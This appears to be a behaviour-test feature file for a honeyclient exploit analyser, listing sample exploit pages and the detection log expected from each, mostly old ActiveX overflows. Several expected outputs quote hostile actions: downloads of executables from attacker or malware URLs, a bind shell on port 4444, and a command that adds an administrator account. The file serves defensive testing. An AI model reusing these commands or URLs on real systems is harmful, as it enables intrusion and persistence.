Feature: Exploits

	Scenario: exploits
		Given set of exploits
			| sample                                       | output                                                                                                                                                   |
			| 22196.html                                   | [NCTAudioFile2 ActiveX] Overflow in SetFormatLikeSample,WinExec,ExitThread,calc.exe                                                                      |
			| 22811_Elazar.html                            | RealMedia RealPlayer Ierpplug.DLL ActiveX,Overflow in Import,Overflow in PlayerProperty                                                                  |
			| 2448.html                                    | [WebViewFolderIcon ActiveX] setSlice attack,webviewfoldericon.webviewfoldericon.1                                                                        |
			| 2mix.html                                    | [Microsoft Access Snapshot Viewer ActiveX] SnapshotPath : http://paksusic.cn/nuc/exe.php, CompressedPath: C:/Program Files/Outlook Express/wab.exe       |
			| 33243-excel.html                             | [Office OCX Exploit redirection] about:blank -> http://monmaroc.com/calc.exe                                                                             |
			| 33243-office.html                            | [Office OCX Exploit redirection] about:blank -> http://www.example.com/file.exe                                                                          |
			| 33243-powerpoint.html                        | [Office OCX Exploit redirection] about:blank -> http://www.example.com/file.exe                                                                          |
			| 33243-word.html                              | [Office OCX Exploit redirection] about:blank -> http://www.example.com/calc.exe                                                                          |
			| 4042.html                                    | [Yahoo! Messenger 8.x Ywcvwr ActiveX] Server Console Overflow                                                                                            |
			| 4043.html                                    | Yahoo! Messenger 8.x Ywcvwr ActiveX] Server Console Overflow                                                                                             |
			| 4148.html                                    | [EnjoySAP ActiveX] PrepareToPostHTM overflow in arg0                                                                                                     |
			| 4149.html                                    | [EnjoySAP ActiveX] LaunchGUI overflow in arg0                                                                                                            |
			| 4158.html                                    | [NeoTraceExplorer.NeoTraceLoader ActiveX] Overflow in arg0                                                                                               |
			| 4230.html                                    | [Nessus Vunlnerability Scanner ScanCtrl ActiveX] deleteReport(../../../../../../../test.txt)                                                             |
			| 4237.html                                    | [Nessus Vunlnerability Scanner ScanCtrl ActiveX] saveNessusRC(../../../../../../Documents and Settings/All Users/Menu Start/Programy/Autostart/exec.bat) |
			| 4250.html                                    | [Yahoo! Messenger 8.x Ywcvwr ActiveX] GetComponentVersion Overflow,LoadLibraryA,port=4444,CreateProcess,cmd                                              |
			| 4351.html                                    | [Yahoo! Messenger 8.x YVerInfo.dll ActiveX Control] Overflow in fvCom arg0,WinExec,calc                                                                  |
			| 4427.html                                    | [JetAudio ActiveX] Downloading from URL http://192.168.0.1/evil.mp3 (saving locally as ..\..\..\..\..\..\..\..\Program Files\JetAudio\JetAudio.exe)      |
			| 4594.html                                    | [SonicWall SSL-VPN NetExtender NELaunchCtrl ActiveX] Overflow in AddRouteEntry,WinExec,calc.exe                                                          |
			| 4613.html                                    | [Shockwave] ShockwaveVersion Stack Overflow                                                                                                              |
			| 4663.html                                    | [BitDefender Online Scanner ActiveX] InitX overflow                                                                                                      |
			| 4829.html                                    | [DivX Player ActiveX] Overflow in SetPassword                                                                                                            |
			| 4869.html                                    | [Gateway Weblaunch ActiveX] Trying to execute ..\..\..\..\windows\system32\calc.exe                                                                      |
			| 4894.html                                    | [StreamAudio ChainCast VMR Client Proxy ActiveX] Buffer overflow in arg0                                                                                 |
			| 4903.html                                    | [DVRHOST Web CMS OCX ActiveX] Overflow in TimeSpanFormat,WinExec,cmd.exe /c net user sun tzu /ADD && net localgroup Administrators sun /ADD              |
			| 4909.html                                    | [Macrovision Exploit 2 redirection] about:blank -> http://www.evilsite/evil.exe                                                                          |
			| 4918.html                                    | [PTZCamPanel ActiveX] Overflow in ConnectServer user arg                                                                                                 |
			| 4932.html                                    | [RTSP MPEG4 SP Control ActiveX] Overflow in MP4Prefix property                                                                                           |
			| 4967.html                                    | [Lycos FileUploader ActiveX] Overflow in HandwriterFilename property                                                                                     |
			| 4974.html                                    | [Comodo AntiVirus ActiveX] Trying to execute: cmd.exe /C echo "hello world" && pause                                                                     |
			| 4979.html                                    | [Move Networks Upgrade Manager ActiveX] Overflow in Upgrade                                                                                              |
			| 4982.html                                    | [Gateway Weblaunch ActiveX] Overflow                                                                                                                     |
			| 4986.html                                    | [NamoInstaller ActiveX] Insecure download from URL http://ATTACKER.COM/HACK.EXE                                                                          |
			| 4987.html                                    | [XUpload ActiveX] Overflow in AddFile method                                                                                                             |
			| 5025.html                                    | [Myspace UPloader ActiveX] Overflow in Action property                                                                                                   |
			| 5043.html                                    | [Yahoo! Music Jukebox ActiveX] Overflow in AddImage                                                                                                      |
			| 5045.html                                    | [NamoInstaller ActiveX] Overflow in Install method,WinExec,calc                                                                                          |
			| 5049.html                                    | [FaceBook Photo Uploader ActiveX] Overflow in ExtractIptc property                                                                                       |
			| 5051.html                                    | [Yahoo! Music Jukebox ActiveX] Overflow in AddButton                                                                                                     |
			| 5052.html                                    | [Yahoo! Music Jukebox ActiveX] Overflow in AddBitmap                                                                                                     |
			| 5153.html                                    | [Ourgame GLWorld ActiveX] Overflow in hgs_startGame,WinExec,calc                                                                                         |
			| 5188.html                                    | [Rising Online Virus Scanner Web Scan ActiveX] UpdateEngine Method vulnerability                                                                         |
			| 5190.html                                    | [Move Networks Quantum Streaming Player Control ActiveX] Overflow in UploadLogs method                                                                   |
			| 5193.html                                    | [D-Link MPEG4 SHM Audio Control ActiveX] Overflow in Url property                                                                                        |
			| 5205.html                                    | [Symantec BackupExec ActiveX] Overflow in property _DOWText0                                                                                             |
			| 5217.html                                    | [ICQ Toolbar ActiveX] Buffer overflow in GetPropertyById                                                                                                 |
			| 5225.html                                    | [Kingsoft AntiVirus ActiveX] SetUninstallName Heap Overflow                                                                                              |
			| 5264.html                                    | [CA BrightStor ActiveX] Overflow in AddColumn                                                                                                            |
			| 5271.html                                    | [RegistryPro ActiveX] About called,[RegistryPro ActiveX] Deleting [HKEY_LOCAL_MACHINE/Software/key]                                                      |
			| 5272.html                                    | [Universal HTTP File Upload ActiveX] Deleting C:/tmp.txt                                                                                                 |
			| 55875.html                                   | [iframe redirection] about:blank -> http://81.95.149.27/go.php?sid=1                                                                                     |
			| ARCserve_AddColumn_BoF.html                  | [CA BrightStor ActiveX] Overflow in AddColumn                                                                                                            |
			| AnswerWorks.htm                              | [AnswerWorks ActiveX] Overflow in GetHistory                                                                                                             |
			| BaiduBar.htm                                 | [BaiduBar.dll ActiveX] DloadDS function trying to download http://ruder.cdut.net/attach/calc.cab                                                         |
			| BitDefender.htm                              | [BitDefender Online Scanner ActiveX] InitX overflow                                                                                                      |
			| CABrightStor.htm                             | [CA BrightStor ActiveX] Overflow in AddColumn                                                                                                            |
			| Comodo.htm                                   | [Comodo AntiVirus ActiveX] Trying to execute: cmd.exe /C echo "hello world" && pause                                                                     |
			| ConnectAndEnterRoom.htm                      | [GlobalLink ConnectAndEnterRoom ActiveX] ConnectAndEnterRoom Overflow                                                                                    |
			| CreativeSoftAttack.htm                       | [CreativeSoft ActiveX] Overflow in cachefolder property                                                                                                  |
			| DLinkMPEG.htm                                | [D-Link MPEG4 SHM Audio Control ActiveX] Overflow in Url property                                                                                        |
			| DPClient.htm                                 | [Xunlei DPClient.Vod.1 ActiveX] DownURL2 Method Buffer Overflow                                                                                          |
			| DVRHOSTWeb.htm                               | [DVRHOST Web CMS OCX ActiveX] Overflow in TimeSpanFormat,WinExec,cmd.exe /c net user sun tzu /ADD && net localgroup Administrators sun /ADD              |
			| DirectShow.htm                               | [Microsoft DirectShow MPEG2TuneRequest ActiveX] Stack Overflow in data property                                                                          |
			| DivX.htm                                     | [DivX Player ActiveX] Overflow in SetPassword                                                                                                            |
			| Domino.htm                                   | [IBM Lotus Domino Web Access Control ActiveX] Overflow in General_ServerName property                                                                    |
			| FileUploader.htm                             | [Lycos FileUploader ActiveX] Overflow in HandwriterFilename property                                                                                     |
			| GatewayWeblaunch.htm                         | [Gateway Weblaunch ActiveX] Trying to execute ..\..\..\..\windows\system32\calc.exe                                                                      |
			| GLIEDown2.htm                                | LoadLibraryA,URLDownloadToFile,http://www.baiduuo.cn/123/ok.exe,WinExec                                                                                  | 
			| Gogago.html                                  | [Gogago YouTube Video Converter ActiveX] Buffer Overflow                                                                                                 |
			| GomWeb.htm                                   | [GOM Player Manager ActiveX] Overflow in OpenURL                                                                                                         |
			| HPInfo_GetRegValue.htm                       | [HP Info Center ActiveX] GetRegValue, reading: //                                                                                                        |
			| HPInfo_LaunchApp.htm                         | [HP Info Center ActiveX] LaunchApp called to run: c:\windows\system32\cmd.exe /C c:\ftpd.bat&del c:\ftpd.bat&del c:\ftpd&del c:\malware.exe              |
			| HPInfo_SetRegValue.htm                       | [HP Info Center ActiveX] SetRegValue: None/None/None set to None                                                                                         |
			| IMWebControl.htm                             | [iMesh IMWebControl ActiveX] NULL value in ProcessRequestEx,cmd.exe /c net user sun tzu /ADD && net localgroup Administrators sun /ADD                   |
			| JavaActiveXMemoryCorruption.html             | [Java Deployment Toolkit ActiveX] Java ActiveX component memory corruption (CVE-2013-2416)                                                               |
			| JetAudioDownloadFromMusicStore.htm           | [JetAudio ActiveX] Downloading from URL http://192.168.0.1/evil.mp3 (saving locally as ..\..\..\..\..\..\..\..\Program Files\JetAudio\JetAudio.exe)      |
			| Kingsoft.htm                                 | [Kingsoft AntiVirus ActiveX] SetUninstallName Heap Overflow                                                                                              |
			| MacrovisionFlexNet.htm                       | [Macrovision ActiveX] AddFile("http://www.evilsite/evil.exe", "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\harmless.exe")            |
			| MicrosoftWorks7Attack.htm                    | [MicrosoftWorks7 ActiveX] Overflow in WksPictureInterface property,WinExec,calc                                                                          |
			| Move.htm                                     | [Move Networks Upgrade Manager ActiveX] Overflow in Upgrade                                                                                              |
			| MyspaceUploader.htm                          | [Myspace UPloader ActiveX] Overflow in Action property                                                                                                   |
			| NCTAudioFile2.htm                            | [NCTAudioFile2 ActiveX] Overflow in SetFormatLikeSample                                                                                                  |
			| NamoInstaller.htm                            | [NamoInstaller ActiveX] Insecure download from URL http://ATTACKER.COM/HACK.EXE                                                                          |
			| NessusScanCtrl.htm                           | [Nessus Vunlnerability Scanner ScanCtrl ActiveX] saveNessusRC(../../../../../../Documents and Settings/All Users/Menu Start/Programy/Autostart/exec.bat) |
			| OurgameGLWorld.html                          | [Ourgame GLWorld ActiveX] Overflow in hgs_startGame                                                                                                      |
			| PPlayer.htm                                  | [Xunlei Thunder PPlayer ActiveX] FlvPlayerUrl Property Handling Buffer Overflow                                                                          |
			| PTZCamPanel.htm                              | [PTZCamPanel ActiveX] Overflow in ConnectServer user arg                                                                                                 |
			| Pps2.html                                    | [Xunlei Thunder PPlayer ActiveX] Remote Overflow Exploit in Logo property                                                                                |
			| QuantumStreaming.htm                         | [Move Networks Quantum Streaming Player Control ActiveX] Overflow in UploadLogs method                                                                   | 
			| RediffBolDownloaderAttack.htm                | [RediffBolDownloader ActiveX] Overflow in url property                                                                                                   |
			| RegistryPro.htm                              | [RegistryPro ActiveX] Deleting [HKEY_LOCAL_MACHINE/Software/key]                                                                                         |
			| RtspVaPgCtrl.htm                             | [RTSP MPEG4 SP Control ActiveX] Overflow in MP4Prefix property                                                                                           |
			| SSReaderPdg2_LoadPage.htm                    | LoadLibraryA,system32,URLDownloadToFile,WinExec,ExitThread                                                                                               |
			| SSReaderPdg2_Register.htm                    | [SSReader Pdg2 ActiveX] Register Method Overflow                                                                                                         |
			| SinaDLoader.htm                              | [SinaDLoader Downloader ActiveX] Fetching from URL hxxp://dddd.nihao69.cn/down/ko.exe                                                                    |
			| SonicWallNetExtenderAddRouteEntry.htm        | [SonicWall SSL-VPN NetExtender NELaunchCtrl ActiveX] Overflow in AddRouteEntry,WinExec,calc.exe                                                          |
			| StormConfig.htm                              | [BaoFeng Storm ActiveX Control] SetAttributeValue Buffer Overflow                                                                                        |
			| StreamAudioChainCast.htm                     | [StreamAudio ChainCast VMR Client Proxy ActiveX] Buffer overflow in arg0                                                                                 |
			| SymantecBackupExec.htm                       | [Symantec BackupExec ActiveX] Overflow in property _DOWText0                                                                                             |
			| Toshiba.htm                                  | [Toshiba Surveillance RecordSend Class ActiveX] Overflow in SetPort                                                                                      |
			| UUSeeUpdate.htm                              | [UUsee UUPgrade ActiveX] Attack in Update Method                                                                                                         |
			| UniversalUpload.htm                          | [Universal HTTP File Upload ActiveX] Deleting C:/tmp.txt                                                                                                 |
			| VLC.htm                                      | [VLC ActiveX] getVariable Overflow                                                                                                                       |
			| WinZip.htm                                   | [WinZip ActiveX] CreateNewFolderFromName Overflow,WinExec,calc,ExitProcess                                                                               |
			| XMLDOM-evasion.html                          | [Microsoft XMLDOM ActiveX] Attempting to load res://c:\Windows\System32\drivers\kl1.sys                                                                  |
			| Xupload.htm                                  | [XUpload ActiveX] Overflow in AddFolder method                                                                                                           |
			| YahooJukebox.htm                             | [Yahoo! Music Jukebox ActiveX] Overflow in AddBitmap                                                                                                     |
			| YahooMessengerYVerInfo.htm                   | [Yahoo! Messenger 8.x YVerInfo.dll ActiveX Control] Overflow in fvCom arg0,WinExec,calc,ExitProcess                                                      |
			| YahooMessengerYwcvwr_GetComponentVersion.htm | [Yahoo! Messenger 8.x Ywcvwr ActiveX] GetComponentVersion Overflow,LoadLibraryA,port=4444,bind,listen,accept,CreateProcess,cmd                           |
			| YahooMessengerYwcvwr_server.htm              | [Yahoo! Messenger 8.x Ywcvwr ActiveX] Server Console Overflow                                                                                            |
			| ZenturiProgramCheckerAttack.htm              | [ZenturiProgramChecker ActiveX] Attack in DebugMsgLog function                                                                                           |
			| aol_ampx.html                                | [AOL Radio AOLMediaPlaybackControl ActiveX] Overflow in AppendFileToPlayList                                                                             |
			| domino.html                                  | [IBM Lotus Domino Web Access Control ActiveX] Overflow in General_ServerName property                                                                    |
			| hpinfo.html                                  | [HP Info Center ActiveX] LaunchApp called to run: c:\windows\system32\cmd.exe /C c:\ftpd.bat&del c:\ftpd.bat&del c:\ftpd&del c:\malware.exe              |
			| hpinfo2.html                                 | [HP Info Center ActiveX] GetRegValue, reading: //                                                                                                        |
			| hpinfo3.html                                 | [HP Info Center ActiveX] SetRegValue: HKEY_LOCAL_MACHINE/SOFTWARE\Classes\CLSID\{62DDEB79-15B2-41E3-8834-D3B80493887A}\InprocServer32/ set to            |
			| hpupdate1.html                               | [HP Info Center ActiveX] SaveToFile(), writes to c:\temp\testfile.txt                                                                                    |
			| hpupdate2.html                               | [HP Info Center ActiveX] SaveToFile(), writes to c:\WINDOWS\system32\dllcache\ntoskrnl.exe                                                               |
			| intuit.html                                  | [AnswerWorks ActiveX] Overflow in GetHistory                                                                                                             |
			| qvod.html                                    | LoadLibraryA,URLDownloadToFile,http://www.360.cn.sxxsnp2.cn/d5.css,WinExec,U.exe,ExitProcess                                                             |
			| qvodctl.html                                 | [Qvod Player QvodCtrl Class ActiveX] Overflow in URL property                                                                                            |
			| qvodsrc2.html                                | LoadLibraryA,URLDownloadToFile,http://www.360.cn.sxxsnp2.cn/d5.css,WinExec,U.exe,ExitProcess                                                             |
			| realplayer-mod.html                          | [RealMedia RealPlayer rmoc3260.DLL ActiveX] Overflow in Console property                                                                                 |
			| rgod_imesh.html                              | [iMesh IMWebControl ActiveX] NULL value in ProcessRequestEx,cmd.exe /c net user sun tzu /ADD && net localgroup Administrators sun /ADD                   |
			| show-283-1.html                              | [Xunlei DPClient.Vod.1 ActiveX] DownURL2 Method Buffer Overflow                                                                                          |
			| ssreader2.html                               | [SSReader Pdg2 ActiveX] Register Method Overflow                                                                                                         |
			| ssreader_0day.html                           | [SSReader Pdg2 ActiveX] Register Method Overflow                                                                                                         |
			| ssreader_noplus.html                         | [SSReader Pdg2 ActiveX] Register Method Overflow                                                                                                         |
			| storm_URL.htm                                | [MPS.StormPlayer.1 ActiveX] URL Console Overflow                                                                                                         |
			| storm_advancedOpen.htm                       | [MPS.StormPlayer.1 ActiveX] advanceOpen Method Overflow                                                                                                  |
			| storm_backImage.htm                          | [MPS.StormPlayer.1 ActiveX] backImage Console Overflow                                                                                                   |
			| storm_isDVDPath.htm                          | [MPS.StormPlayer.1 ActiveX] isDVDPath Method Overflow                                                                                                    |
			| storm_rawParse.htm                           | [MPS.StormPlayer.1 ActiveX] rawParse Method Overflow                                                                                                     |
			| storm_titleImage.htm                         | [MPS.StormPlayer.1 ActiveX] titleImage Console Overflow                                                                                                  |
			| stormplayer.html                             | [MPS.StormPlayer.1 ActiveX] rawParse Method Overflow,GetProcAddress,GetSystemDirectoryA,WinExec,ExitThread,http://w.qqnetcn.cn/d2.exe,a.exe              |
			| toshiba.html                                 | [Toshiba Surveillance RecordSend Class ActiveX] Overflow in SetPort                                                                                      |
			| xupload.html                                 | [XUpload ActiveX] Overflow in AddFolder method                                                                                                           |
		then run exploit 

	Scenario: misc
		Given set of misc
			| sample                                       | output                                                                                                                                                   |
			| PluginDetect-0.7.6.html                      | AdobeReader version: 9.1.0.0,Flash version: 10.0.64.0                                                                                                    |
			| PluginDetect-0.7.8.html                      | ActiveXObject: shockwaveflash.shockwaveflash.10,ActiveXObject: javawebstart.isinstalled.1.6.0.0,ActiveXObject: javaplugin.160_32                         |
			| PluginDetect-0.7.8.html                      | 9.1.0,10.0.64.0,ActiveXObject: javawebstart.isinstalled.1.6.0.0,ActiveXObject: javaplugin.160_32                                                         |
			| test1.html                                   | [Window] Alert Text: one                                                                                                                                 |
			| test2.html                                   | [Window] Alert Text: Java enabled: true                                                                                                                  |
			| test3.html                                   | [Window] Alert Text: foo                                                                                                                                 |
			| testAppendChild.html                         | <div>Don't care about me</div>,<div>Just a sample</div>                                                                                                  |
			| testClipboardData.html                       | Test ClipboardData                                                                                                                                       |
			| testCloneNode.html                           | <div id="cloned"><q>Can you copy <em>everything</em> I say?</q></div>                                                                                    |
			| testCloneNode2.html                          | <button align="left" id="myButton">Clone node</button>                                                                                                   |
			| testCreateStyleSheet.html                    | style1.css" rel="stylesheet"></link><link href="style2.css" rel="stylesheet"></link><link href="style3.css" rel="stylesheet"></link><link href="style4   |
			| testDocumentAll.html                         | <a href="http://www.google.com">Google</a>                                                                                                               |
			| testDocumentWrite1.html                      | Foobar,Google</a><script>alert('foobar');</script><script language="VBScript">alert('Gnam');</script><script>alert('Aieeeeee');</script></body>          |
			| testExternalSidebar.html                     | [Window] Alert Text: Internet Explorer >= 7.0 or Chrome                                                                                                  |
			| testGetElementsByClassName.html              | <div class="example">First</div>,<div class="example">Hello World!</div>,<div class="example">Second</div>                                               |
			| testInnerHTML.html                           | dude,Fred Flinstone                                                                                                                                      |
			| testInsertBefore.html                        | <div>Just a sample</div><div>I'm your reference!</div></body></html>                                                                                     |
			| testLocalStorage.html                        | Window] Alert Text: Fired,Alert Text: bar,Alert Text: south                                                                                              |
			| testPlugins.html                             | Shockwave Flash 10.0.64.0,Windows Media Player 7,Adobe Acrobat                                                                                           |
			| testLocation1.html                           | [HREF Redirection (document.location)] Content-Location: about:blank --> Location: http://www.google.com                                                 |
			| testLocation2.html                           | [HREF Redirection (document.location)],Content-Location: about:blank --> Location: http://www.google.com                                                 |
			| testLocation3.html                           | [HREF Redirection (document.location)],Content-Location: about:blank --> Location: http://www.google.com                                                 |
			| testLocation4.html                           | [HREF Redirection (document.location)],Content-Location: about:blank --> Location: http://www.google.com                                                 |
			| testLocation5.html                           | [HREF Redirection (document.location)],Content-Location: about:blank --> Location: http://www.google.com                                                 |
			| testLocation6.html                           | [HREF Redirection (document.location)],Content-Location: about:blank --> Location: http://www.google.com                                                 |
			| testMetaXUACompatibleEdge.html               | [Window] Alert Text: 9                                                                                                                                   |
			| testMetaXUACompatibleEmulateIE.html          | [Window] Alert Text: 8                                                                                                                                   |
			| testMetaXUACompatibleIE.html                 | [Window] Alert Text: 9                                                                                                                                   |
			| testNode.html                                | <a href="/" id="thelink">test</a>,thediv                                                                                                                 |
			| testNode2.html                               | <a href="/bar.html" id="thelink">test</a>,thediv2                                                                                                        |
			| testPlugins.html                             | Shockwave Flash 10.0.64.0,Windows Media Player 7                                                                                                         |
			| testQuerySelector.html                       | Alert Text: Have a Good life.,CoursesWeb.net                                                                                                             |
			| testQuerySelector2.html                      | <li class="aclass">CoursesWeb.net</li>,<li>MarPlo.net</li>,<li class="aclass">php.net</li>                                                               |
			| testScope.html                               | foobar,foo,bar,True,3,2012-10-07 11:13:00,3.14159265359,/foo/i                                                                                           |
			| testSessionStorage.html                      | key1,key2,value1,value3                                                                                                                                  |
			| testSetInterval.html                         | [Window] Alert Text: Hello                                                                                                                               |
			| testText.html                                | <p id="p1">First line of paragraph.<br/> Some text added dynamically. </p>                                                                               |
			| testWindowOnload.html                        | [Window] Alert Text: Fired                                                                                                                               |
			| test_click.html                              | [window open redirection] about:blank -> https://www.google.com                                                                                          |
			| testInsertAdjacentHTML1.html                 | <div id="five">five</div><div id="one">one</div>                                                                                                         |
			| testInsertAdjacentHTML2.html                 | <div id="two"><div id="six">six</div>two</div>                                                                                                           |
			| testInsertAdjacentHTML3.html                 | <div id="three">three<div id="seven">seven</div></div>                                                                                                   |
			| testInsertAdjacentHTML4.html                 | <div id="four">four</div><div id="eight">eight</div>                                                                                                     |
		then run misc
